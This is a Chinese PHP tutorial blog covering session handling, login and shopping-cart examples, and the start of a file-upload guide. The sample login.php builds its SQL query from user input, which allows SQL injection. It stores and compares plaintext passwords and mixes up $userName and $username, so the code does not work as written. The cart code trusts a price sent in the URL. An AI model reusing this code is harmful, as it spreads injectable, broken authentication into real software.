<h3 id="四-PHP中使用session"><a href="#四-PHP中使用session" class="headerlink" title="四. PHP中使用session"></a><font color="#FF6347" face="Comic sans MS">四. PHP中使用session</font></h3><p>什么是session以及一些使用方法?可参考博文：<br><font color="#00B2EE">[<a href="http://www.cnblogs.com/lxwphp/p/9237312.html">php中Session使用方法详解</a>]</font><br><font color="#00B2EE">[<a href="https://www.cnblogs.com/mike1314/p/6985457.html">PHP会话机制—session的基本使用</a>]</font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_sessions.asp">W3school PHP Sessions</a>]</font></p>
<p>&emsp;</p>
<ol>
<li>注意：session_start()函数之前不能有任何输出,session_start() 函数必须位于 <code>&lt;html&gt;</code> 标签之前：<br><code>&lt;?php session_start(); ?&gt;</code><br><code>&lt;\html&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></li>
<li>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 Session以数组的形式使用，如：$_SESSION[‘session名’]</li>
<li><strong>注册一个会话变量和读取Session</strong></li>
<li><font color="#FF7F00"><strong>在PHP中使用Session变量，除了要启动之外，还要经过注册的过程</strong></font>。注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION<font color="#FF7F00"><strong>关联数组</strong></font>中的键名具有和PHP中普通变量相同的命名规则。</li>
</ol>
<p>&emsp;</p>
<h4 id="4-1-开启session"><a href="#4-1-开启session" class="headerlink" title="4.1 开启session"></a><font color="#3CB371" face="Comic sans MS">4.1 开启session</font></h4><p><strong>使用函数：</strong><font color="#00B2EE"><strong>bool session_start()</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie(void) 函数</a>]</font></p>
<p>首先我们要开启session，那么第一个要学习的函数就是<br>bool session_start()了，这个函数没有参数。在php文件的开始使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="4-2-注册-添加session数据"><a href="#4-2-注册-添加session数据" class="headerlink" title="4.2 (注册)添加session数据"></a><font color="#3CB371" face="Comic sans MS">4.2 (注册)添加session数据</font></h4><p>开启会话之后，那么在接下来的处理中，我们就可以使用$_SESSION变量来存取信息了。我们要知道的是$_SESSION变量是个数组。当我们要把信息存入session的时候应该这么写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;userName&#x27;</span>] = <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="4-3-读取session数据"><a href="#4-3-读取session数据" class="headerlink" title="4.3 读取session数据"></a><font color="#3CB371" face="Comic sans MS">4.3 读取session数据</font></h4><p>读取很简单，就像我们使用数组一样，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userName = $_SESSION[<span class="string">&#x27;userName&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>当然也可以 $_SESSION[‘userName’] 来用。和<font color="red"><strong>数组一样的使用</strong></font>。</p>
<p>&emsp;</p>
<h4 id="4-4-销毁session数据"><a href="#4-4-销毁session数据" class="headerlink" title="4.4 销毁session数据"></a><font color="#3CB371" face="Comic sans MS">4.4 销毁session数据</font></h4><p>我们可以使用很多种方式来销毁session数据。<br><font color="#00B2EE"><strong>a) unset函数</strong></font><br>我们通过使用类似<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;XXX&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>来销毁session中的 XXX 变量。</p>
<blockquote>
<p><font color="#FF7F00"><strong>请不要！请不要！请不要unset($_SESSION),会导致后续无法使用$_SESSION这个变量！！！</strong></font></p>
</blockquote>
<p>&emsp;<br><font color="#00B2EE"><strong>b) 空数组赋值给session变量</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$\_SESSION = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>之前我们说过$_SESSOIN变量是个数组，那么空数组赋值的话也是相当于将当前会话的$_SESSION变量中的值销毁。</p>
</blockquote>
<p>&emsp;<br><font color="#00B2EE"><strong>c) session_destory() 函数</strong></font><br><strong>这个函数会销毁当前会话中的全部数据，并结束当前会话。但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。</strong></p>
<p><font color="#00B2EE"></font></p>
<p>&emsp;</p>
<h4 id="4-5-session的扩展"><a href="#4-5-session的扩展" class="headerlink" title="4.5 session的扩展"></a><font color="#3CB371" face="Comic sans MS">4.5 session的扩展</font></h4><p>我们可以使用很多种方式来销毁session数据。<br>默认session存储在哪里?<br>&emsp;<br>1.在<code>php.ini</code>配置文件中有这么一行 <code>session.save_handler = files</code>,<br>files说明了php默认的是用文件读写的方式来保存session的。那么在哪个目录呢？继续看。session.save_path = “/tmp”,这一行前面有个 ; ，说明是被注释的，不过即便这样，php默认的session 也是保存在这里的，<code>/tmp</code>目录。</p>
<p>&emsp;<br>&emsp;</p>
<h3 id="五-SESSION应用实例"><a href="#五-SESSION应用实例" class="headerlink" title="五. SESSION应用实例"></a><font color="#FF6347" face="Comic sans MS">五. SESSION应用实例</font></h3><h4 id="5-1-登陆例子"><a href="#5-1-登陆例子" class="headerlink" title="5.1 登陆例子"></a><font color="#3CB371" face="Comic sans MS">5.1 登陆例子</font></h4><blockquote>
<p><strong>2个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">login.php</font>，用于登陆界面；</li>
<li><font color="#FF7F00">welcome.php</font>，用于接收从login.php的跳转并设置session。</li>
</ol>
<p><strong>首先建立数据库信息：</strong><br>新建一个名为 login 的数据库，再建一个 user 表，表的结构有2个字段:<br>username  varchar(20)<br>password  varchar(20)</p>
<p>&emsp;<br>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ( $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">   $userName = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//从db获取用户信息   数据库信息改成自己的</span></span><br><span class="line">   $conn = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   $res = mysqli_query($conn,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$username</span>&#x27; &quot;</span>);</span><br><span class="line">   $row = mysqli_fetch_assoc($res);</span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] == $password) &#123;</span><br><span class="line">       <span class="comment">//密码验证通过，设置session，把用户名和密码保存在服务端</span></span><br><span class="line">       $_SESSION[<span class="string">&#x27;username&#x27;</span>] = $username;</span><br><span class="line">       $_SESSION[<span class="string">&#x27;password&#x27;</span>] = $password;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//最后跳转到登录后的欢迎页面 //注意：这里我们没有像cookie一样带参数过去</span></span><br><span class="line">       header(<span class="string">&#x27;Location: welcome.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- 这里指明页面编码 --&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">       &lt;div&gt;</span><br><span class="line">           用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">           密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">           &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;        </span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br>welcome.php 这里我们用的是session中的信息,而不是像cookie一样在url中带参数过来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $username;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;</p>
<h4 id="5-2-购物车例子"><a href="#5-2-购物车例子" class="headerlink" title="5.2 购物车例子"></a><font color="#3CB371" face="Comic sans MS">5.2 购物车例子</font></h4><blockquote>
<p><strong>3个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">goodsList.php</font> 这个是商品展示页，还有功能：如果是第一次购买某物品，则在购物车中加入该商品信息和计算总价，如果再次点击购买，则已购商品数量加1，总价重新计算，查看购物车链接可以到购物车页面。</li>
<li><font color="#FF7F00">buy.php</font> 此页完成购买功能，然后再次跳转到商品列表。主要是做了在session中处理购买商品操作。</li>
<li><font color="#FF7F00">shoppingCart.php</font> 此页展示购物车中的商品、价格、总价等信息。</li>
</ol>
<p>&emsp;<br><strong>首先建立数据库信息：</strong><br>建立名为test的数据库，库中有个shop表，表结构有3个字段：<br>id  int(10)<br>name  varchar(20)<br>price  varchar(20)</p>
<p>&emsp;<br>goodsList.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $goods = <span class="keyword">array</span>();</span><br><span class="line">   <span class="comment">//从数据库获取商品信息存入$goods二维数组</span></span><br><span class="line">   $i = <span class="number">0</span>;</span><br><span class="line">   <span class="comment">//这里请换上自己的数据库相关信息</span></span><br><span class="line">   $conn = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">   $res = mysqli_query($conn,<span class="string">&#x27;select * from shop&#x27;</span>);</span><br><span class="line">   <span class="comment">//这里把商品信息放到$goods二维数组，每一维存的是单个</span></span><br><span class="line">   <span class="comment">//商品的信息，比如商品名、价格。</span></span><br><span class="line">   <span class="keyword">while</span> ($row = mysqli_fetch_assoc($res)) &#123;</span><br><span class="line">       $goods[$i][<span class="string">&#x27;id&#x27;</span>] = $row[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">       $goods[$i][<span class="string">&#x27;name&#x27;</span>] = $row[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">       $goods[$i][<span class="string">&#x27;price&#x27;</span>] = $row[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">       $i++ ;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//取出商品信息显示在页面上，并添加购买功能</span></span><br><span class="line">       <span class="keyword">foreach</span> ($goods <span class="keyword">as</span> $value) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27; 商品名 &#x27;</span> . $value[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . $value[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=buy.php?name=&quot;</span> . $value[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&amp;price=&#x27;</span> . $value[<span class="string">&#x27;price&#x27;</span>] .<span class="string">&quot;&gt;购买&lt;/a&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">   &lt;a href=<span class="string">&quot;shoppingCart.php&quot;</span>&gt;查看购物车&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>buy.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//开启session</span></span><br><span class="line">   session_start();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取传过来的商品名和价格</span></span><br><span class="line">   $name = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   $price = $_GET[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把session中的商品信息和传过来的(刚买的)商品信息对比</span></span><br><span class="line">   $goods = $_SESSION[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($name == $goods[$name][<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">       <span class="comment">//买过的话，则总价格增加，相应商品数量增加</span></span><br><span class="line">       $_SESSION[<span class="string">&#x27;totalPrice&#x27;</span>] += $price;</span><br><span class="line">       $goods[$name][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//第一次买的话，将相应的商品信息添加到session中</span></span><br><span class="line">       $goods[$name][<span class="string">&#x27;name&#x27;</span>] = $name;</span><br><span class="line">       $goods[$name][<span class="string">&#x27;price&#x27;</span>] = $price;</span><br><span class="line">       $goods[$name][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">       $_SESSION[<span class="string">&#x27;totalPrice&#x27;</span>] += $price;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $_SESSION[<span class="string">&#x27;goods&#x27;</span>] = $goods;</span><br><span class="line">   <span class="comment">//购买处理完毕后跳转到商品列表</span></span><br><span class="line">   header(<span class="string">&#x27;location: goodsList.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>shoppingCart.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//将session中的商品信息(即购物车中的商品)和总价显示到页面</span></span><br><span class="line">$goods = $_SESSION[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;您买了:&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($goods <span class="keyword">as</span> $value) &#123;</span><br><span class="line">   <span class="keyword">echo</span> $value[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . $value[<span class="string">&#x27;price&#x27;</span>] . <span class="string">&#x27; 数量 &#x27;</span> . $value[<span class="string">&#x27;number&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;总价：&#x27;</span> . $_SESSION[<span class="string">&#x27;totalPrice&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;goodsList.php&quot;</span>&gt;返回商品列表&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>效果图如下：</p>
<p><img data-src="https://i.loli.net/2019/02/26/5c7522ea3d61f.png" alt="1"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件上传</title>
    <url>/post/PHP-Upload/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件上传</font></center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一-修改php-ini文件"><a href="#一-修改php-ini文件" class="headerlink" title="一. 修改php.ini文件"></a><font color="#FF6347" face="Comic sans MS">一. 修改php.ini文件</font></h3><p>一般情况需要修改：[可以使用ctrl+f 搜索相关配置项。]</p>
<table>
<thead>
<tr>
<th align="center">配置项</th>
<th align="left">功能说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file_uploads</td>
<td align="left">on为开启文件上传功能，off为关闭</td>
</tr>
<tr>
<td align="center">post_max_size</td>
<td align="left">系统允许的POST传参的最大值</td>
</tr>
<tr>
<td align="center">upload_max_filesize</td>
<td align="left">系统允许的上传文件的最大值</td>
</tr>
<tr>
<td align="center">memory_limit</td>
<td align="left">内存使用限制</td>
</tr>
<tr>
<td align="center">max_execution_time</td>
<td align="left">(1)脚本执行时间,参数的单位为秒。<br>(2)这个参数是设定脚本的最大执行时间。<br>(3)也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件<br>上传的时候，可能会涉及到这一项参数的修改。<br>(4)上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建<br>议使用。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>建议尺寸：</strong></font> file_size(文件大小) &lt; upload_max_filesize &lt; post_max_size &lt; memory_limit</p>
</blockquote>
<p> &emsp;<br>&emsp;</p>
<h3 id="三-is-uploaded-file-函数、数组-FILES"><a href="#三-is-uploaded-file-函数、数组-FILES" class="headerlink" title="三. is_uploaded_file()函数、数组$_FILES"></a><font color="#FF6347" face="Comic sans MS">三. is_uploaded_file()函数、数组$_FILES</font></h3><h4 id="2-1-创建一个文件上传表单"><a href="#2-1-创建一个文件上传表单" class="headerlink" title="2.1 创建一个文件上传表单"></a><font color="#3CB371" face="Comic sans MS">2.1 创建一个文件上传表单</font></h4><p>请看下面这个供上传文件的 HTML 表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<blockquote>
<p><font color="#FF7F00"><strong>请留意如下有关此表单的信息：</strong></font></p>
</blockquote>
<ol>
<li><strong>&lt;’&#39;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 <font color="#FF7F00">“multipart/form-data”</font>。</strong></li>
<li><strong>&lt;’&#39;input&gt; 标签的 <font color="#FF7F00">type=”file”</font> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</strong></li>
</ol>
<p>&emsp;</p>
<h4 id="2-2-is-uploaded-file-函数"><a href="#2-2-is-uploaded-file-函数" class="headerlink" title="2.2 is_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.2 is_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-filesystem-is-uploaded-file.html">PHP is_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>检查指定的文件是否是通过 <strong>HTTP POST</strong> 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。</p>
</blockquote>
<p><strong>语法： is_uploaded_file(file)</strong></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要检查的文件。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>该函数的结果会被缓存。请使用 <strong>clearstatcache()</strong> 来清除缓存。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is not uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">上面的代码将输出：</span><br><span class="line"></span><br><span class="line">test.txt is not uploaded via HTTP POST</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="2-3-FILES-数组"><a href="#2-3-FILES-数组" class="headerlink" title="2.3  $_FILES 数组"></a><font color="#3CB371" face="Comic sans MS">2.3  $_FILES 数组</font></h4><p>当客户端上传文件后，我们在action=”xxxx.php”的xxxx.php页面就获得了一个**$_FILES 数组 。**<br><font color="#FF7F00"><strong>$_FILES 数组内容如下:</strong> </font></p>
<table>
<thead>
<tr>
<th align="center">数组元素</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_FILES[“File”][“name”]</td>
<td align="left">上传文件的名称。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“type”]</td>
<td align="left">文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“size”]</td>
<td align="left">已上传文件的大小，单位为字节。</td>
</tr>
<tr>
<td align="center">$_FILES[“File’][“tmp_name”]</td>
<td align="left">文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在ph<br>p.ini的upload_tmp_dir 指定，但 用 putenv()函数设置是不起作用的。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“error”]</td>
<td align="left">和该文件上传相关的错误代码。[“error”] 是在 PHP 4.2.0 版本中增加的。<br>下面是它的说明：(它们在PHP3.0以后成了常量或0123467)</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="#00B2EE"><strong>$_FILES数组结构：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var_dump()或print_r()</span></span><br><span class="line"><span class="comment">//打印变量的相关信息,将变量的信息详细的展示出来</span></span><br><span class="line">var_dump($_FILES);             </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">打印出来的结果的数组结构如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt; </span><br><span class="line">       <span class="keyword">array</span> (size=<span class="number">5</span>)</span><br><span class="line">       <span class="comment">//文件名</span></span><br><span class="line">      <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">      <span class="comment">//文件的mime类型</span></span><br><span class="line">      <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>)                    </span><br><span class="line">      <span class="comment">//缓存文件，上传的图片即保存在这里</span></span><br><span class="line">      <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpC32A.tmp&#x27;</span> (length=<span class="number">23</span>)</span><br><span class="line">      <span class="comment">//错误码，详见上面错误码介绍</span></span><br><span class="line">      <span class="string">&#x27;error&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span>                                             </span><br><span class="line">      <span class="comment">//上传的文件大小</span></span><br><span class="line">      <span class="string">&#x27;size&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span></span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="2-4-move-uploaded-file-函数"><a href="#2-4-move-uploaded-file-函数" class="headerlink" title="2.4  move_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.4  move_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp">PHP move_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>将上传的文件移动到新位置，并命名。</p>
</blockquote>
<p><strong>bool</strong> <font color="#00B2EE"><strong>move_uploaded_file ( file, newloc)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要移动的文件。上传后的临时文件名，由系统自动生成。</td>
</tr>
<tr>
<td align="center">newloc</td>
<td align="left">必需。规定文件的新位置。包含有路径的新的文件名。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li><strong>参数file一般为$_FILES[“File’][“tmp_name”]，</strong><font color="#FF7F00"><strong>是一个文件完整的临时路径和文件名；</strong></li>
<li><strong>参数newloc为新的路径，</strong><font color="#FF7F00"><strong>并且还要加上相应的重新命名文件的的格式。</strong></font></li>
<li><strong>本函数仅用于通过 HTTP POST 上传的文件。</strong></li>
<li>本函数检查并确保由 file 指定的文件<strong>是合法的上传文件</strong>（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</li>
<li><font color="#FF7F00"><strong>返回值：</strong></font>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。<br>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</li>
